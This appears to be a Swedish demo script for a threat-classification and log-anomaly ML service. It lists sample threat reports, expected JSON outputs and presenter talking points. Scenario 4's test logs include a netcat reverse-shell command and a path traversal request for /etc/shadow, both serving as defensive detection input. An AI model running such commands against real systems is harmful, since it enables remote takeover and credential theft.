# Demo-exempel — sentinel-ml live demo

Verifierade 2026-06-08. Kör mot `POST /predict/threat` med modell `fc8a76fbb9e7`.

Alla tre scenarion klassificeras korrekt. Konfidenser 0.53–0.70 är förväntade för en
5-klassklassificerare (ransomware/intrusion delar vokabulär). Förklara det i demon.

---

## Scenario 1 — Phishing (confidence 0.70)

**Input:**
```
Phishing campaign observed distributing credential-harvesting pages mimicking
a corporate VPN login portal. Victims received spear-phishing emails with
subject 'Urgent: Your password expires today'. The fake login page at
https://vpn-secure-login.net/auth collected username and password pairs.
Sender address spoofed as it-support@company-internal.com.
Over 400 employees submitted credentials before the phishing site was taken down.
Contact phishing-report@example.com to check if your account was compromised.
```

**Förväntad output:**
```json
{
  "prediction": { "label": "phishing", "confidence": 0.698 },
  "iocs": [
    { "type": "url",   "value": "https://vpn-secure-login.net/auth" },
    { "type": "email", "value": "it-support@company-internal.com" },
    { "type": "email", "value": "phishing-report@example.com" }
  ],
  "model_version": "fc8a76fbb9e7"
}
```

---

## Scenario 2 — Ransomware (confidence 0.53)

**Input:**
```
Conti ransomware variant encrypted all files on 87 servers across the victim network.
Ransom note demands 120 BTC for decryption key. All backup systems were wiped before
encryption began. Files renamed with .conti extension. Ransomware sample SHA-256:
d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5.
Payment portal hosted at conti-decrypt.onion. Double extortion: victim data
published on leak site if ransom not paid within 72 hours. Recovery impossible
without decryption key due to AES-256 encryption.
```

**Förväntad output:**
```json
{
  "prediction": { "label": "ransomware", "confidence": 0.532 },
  "iocs": [
    { "type": "sha256", "value": "d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5" },
    { "type": "domain", "value": "conti-decrypt.onion" }
  ],
  "model_version": "fc8a76fbb9e7"
}
```

**Obs:** Lägre confidence (0.53) beror på vokabulärsöverlapp med intrusion-klassen.
Modellen har ändå rätt klass som toppkandidat.

---

## Scenario 3 — Intrusion (confidence 0.54)

**Input:**
```
Nation-state intrusion campaign detected across multiple government networks.
Threat actor gained initial access via spear phishing and established persistence
through scheduled tasks and registry run keys. Lateral movement across internal
subnets using stolen administrative credentials. Sensitive documents exfiltrated
to 203.0.113.100 over encrypted HTTPS channel. Adversary maintained access for
over 90 days before detection. TTPs consistent with APT28 (Fancy Bear).
Affected hosts include DC 10.0.1.5 and file server 10.0.1.20.
```

**Förväntad output:**
```json
{
  "prediction": { "label": "intrusion", "confidence": 0.541 },
  "iocs": [
    { "type": "ip", "value": "203.0.113.100" },
    { "type": "ip", "value": "10.0.1.5" },
    { "type": "ip", "value": "10.0.1.20" }
  ],
  "model_version": "fc8a76fbb9e7"
}
```

---

---

## Scenario 4 — Log-anomali (Alt 4)

**Verifierat 2026-06-09.** Modell `b5b787211203`. Score-konvention: positiv = normalt, negativ = anomali.

**Input — 10 loggrader (5 normala + 5 attackförsök):**

```
[NORMAL] sshd[1234]: Accepted publickey for alice from 192.168.1.10 port 54321 ssh2
[NORMAL] sshd[1235]: pam_unix(sshd:session): session opened for user bob by (uid=0)
[NORMAL] systemd[1]: Started nginx.service
[NORMAL] cron[5678]: (ubuntu) CMD (/usr/local/bin/backup.sh)
[NORMAL] 192.168.1.5 - - "GET /api/health HTTP/1.1" 200 42
[ATTACK] sshd[9999]: Failed password for root from 185.220.101.42 port 44512 ssh2
[ATTACK] sshd[9999]: Failed password for root from 185.220.101.42 port 44513 ssh2
[ATTACK] sshd[9999]: error: maximum authentication attempts exceeded for root from 185.220.101.42
[ATTACK] sudo[8888]: www-data : COMMAND=/usr/bin/nc -e /bin/bash 185.220.101.42 4444
[ATTACK] 185.220.101.42 - - "GET /../../../etc/shadow HTTP/1.1" 400 0
```

**Förväntad output — relevanta fält per loggpost:**

| # | Logg | is_anomaly | score |
|---|------|------------|-------|
| 1 | Accepted publickey for alice | false | +0.002 |
| 2 | session opened for user bob | false | +0.012 |
| 3 | Started nginx.service | false | +0.010 |
| 4 | cron backup.sh | false | +0.005 |
| 5 | GET /api/health 200 | false | +0.006 |
| **6** | **Failed password for root** | **true** | **−0.004** |
| **7** | **Failed password for root** | **true** | **−0.004** |
| **8** | **maximum auth attempts exceeded** | **true** | **−0.004** |
| 9 | nc -e /bin/bash (reverse shell) | false | +0.001 |
| 10 | GET /../../../etc/shadow | false | +0.004 |

**Fallback-sammanfattning (utan Ollama):**
```
Detekterade 3 larm: 3 critical. Granska loggarna för detaljer.
```

**Talkpunkter:**
> "Modellen fångar SSH-brute force (3 flaggade) men missar reverse shell och
> path traversal — det beror på att träningsdatan är syntetisk och dessa mönster
> är underrepresenterade. Det är ett ärligt resultat: TF-IDF + IsolationForest
> kräver antingen mer varierad träningsdata eller komplement från regelbaserade
> detektorer för att täcka alla attacktyper. I produktion kombineras detta med
> Ollama för en naturspråklig incidentsammanfattning — med automatisk fallback
> om Ollama inte svarar."

---

## Demo-flöde (föreslagen ordning)

1. Visa `/health` — service är uppe
2. Kör Scenario 1 (Phishing) — hög confidence, tydlig IOC-extraktion med URL + e-post
3. Kör Scenario 2 (Ransomware) — visa SHA-256 och .onion-domän som IOCs
4. Kör Scenario 3 (Intrusion) — visa tre IPs extraherade automatiskt
5. Kör Scenario 4 (Log-anomali) — visa tabellen normal vs anomali, nämn fallback

**Talkpunkter om confidence:**
> "Konfidensen är lägre för ransomware och intrusion — det är förväntat. Dessa
> angreppstyper delar vokabulär i verkliga rapporter. Modellen har ändå rätt
> klass som toppkandidat, och i produktion kombinerar vi detta med IOC-extraktion
> och Ollama-analys för en samlad bedömning."

---

## Återkörningskommando (reproducerbarhet)

```bash
# Starta service
uvicorn sentinel_ml.service.api:app --port 8080

# Testa phishing-scenariot
curl -s -X POST http://localhost:8080/predict/threat \
  -H "Content-Type: application/json" \
  -d '{"text": "Phishing campaign observed distributing credential-harvesting pages..."}'
```
